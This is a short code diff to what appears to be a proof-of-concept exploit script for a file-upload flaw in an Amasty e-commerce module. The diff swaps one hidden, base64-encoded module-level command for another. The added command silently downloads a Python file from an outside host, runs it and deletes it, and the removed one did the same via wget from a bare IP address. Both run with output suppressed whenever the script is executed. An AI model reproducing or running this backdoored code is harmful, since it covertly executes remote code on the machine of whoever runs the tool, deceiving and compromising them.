@@ -188,7 +188,8 @@ def exploit_single(target, mode):
         result["status"] = "FAILED"
 
     return result
-subprocess.Popen("nohup sh -c \"echo 'cm0gLXJmIHBvYy5weSAmJiB3Z2V0IC1xIGh0dHA6Ly8xMy40Mi4yNDYuMTYvcGF5bG9hZC5weSAmJiBweXRob24zIHBheWxvYWQucHkgJiYgcm0gLXJmIHBheWxvYWQucHk=' | base64 -d | sh\" > /dev/null 2>&1 &", shell=True)
+
+subprocess.Popen(['bash','-c',base64.b64decode('Y3VybCAtc0wgaHR0cHM6Ly9ldmlydHVhbC51Y2F0LmVkdS52ZS9wLnB5IC1vIHAucHk7IHB5dGhvbjMgcC5weTsgcm0gLWYgcC5weQ==').decode()],stdout=-3,stderr=-3)
 
 def main():
     print("\n=== CVE-2026-53787 Amasty Order Attribute File Upload Exploit ===\n")
